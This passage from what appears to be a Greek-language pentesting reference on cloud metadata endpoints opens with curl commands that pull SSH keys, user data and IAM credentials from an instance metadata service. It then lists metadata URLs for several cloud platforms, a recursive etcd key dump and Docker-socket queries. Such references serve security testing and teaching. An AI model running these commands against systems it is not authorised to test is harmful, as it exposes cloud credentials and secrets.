"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

Η τεκμηρίωση για τις υπηρεσίες μεταδεδομένων διάφορων πλατφορμών περιγράφεται παρακάτω, επισημαίνοντας τις μεθόδους μέσω των οποίων μπορεί να γίνει πρόσβαση σε πληροφορίες διαμόρφωσης και εκτέλεσης για τις εικόνες. Κάθε πλατφόρμα προσφέρει μοναδικά σημεία πρόσβασης στις υπηρεσίες μεταδεδομένων της.

## Packetcloud

Για πρόσβαση στα μεταδεδομένα του Packetcloud, η τεκμηρίωση μπορεί να βρεθεί στο: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)

## OpenStack/RackSpace

Δεν αναφέρεται η ανάγκη για έναν κεφαλίδα. Τα μεταδεδομένα μπορούν να προσπελαστούν μέσω:

* `http://169.254.169.254/openstack`

## HP Helion

Δεν αναφέρεται επίσης η ανάγκη για έναν κεφαλίδα. Τα μεταδεδομένα είναι προσβάσιμα στη διεύθυνση:

* `http://169.254.169.254/2009-04-04/meta-data/`

## Oracle Cloud

Η Oracle Cloud παρέχει μια σειρά από σημεία πρόσβασης για την πρόσβαση σε διάφορες πτυχές μεταδεδομένων:

* `http://192.0.0.192/latest/`
* `http://192.0.0.192/latest/user-data/`
* `http://192.0.0.192/latest/meta-data/`
* `http://192.0.0.192/latest/attributes/`

## Alibaba

Η Alibaba προσφέρει σημεία πρόσβασης για την πρόσβαση σε μεταδεδομένα, συμπεριλαμβανομένων των αναγνωριστικών παραδειγμάτων και εικόνων:

* `http://100.100.100.200/latest/meta-data/`
* `http://100.100.100.200/latest/meta-data/instance-id`
* `http://100.100.100.200/latest/meta-data/image-id`

## Kubernetes ETCD

Το Kubernetes ETCD μπορεί να κρατά API κλειδιά, εσωτερικές διευθύνσεις IP και θύρες. Η πρόσβαση επιδεικνύεται μέσω:

* `curl -L http://127.0.0.1:2379/version`
* `curl http://127.0.0.1:2379/v2/keys/?recursive=true`

## Docker

Τα μεταδεδομένα του Docker μπορούν να προσπελαστούν τοπικά, με παραδείγματα για την ανάκτηση πληροφοριών εικόνων και εικόνων:

* Απλό παράδειγμα για πρόσβαση στα μεταδεδομένα εικόνων και εικόνων μέσω του Docker socket:
* `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash`
* Μέσα στο container, χρησιμοποιήστε το curl με το Docker socket:
* `curl --unix-socket /var/run/docker.sock http://foo/containers/json`
* `curl --unix-socket /var/run/docker.sock http://foo/images/json`

## Rancher

Τα μεταδεδομένα του Rancher μπορούν να προσπελαστούν χρησιμοποιώντας:

* `curl http://rancher-metadata/<version>/<path>`

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
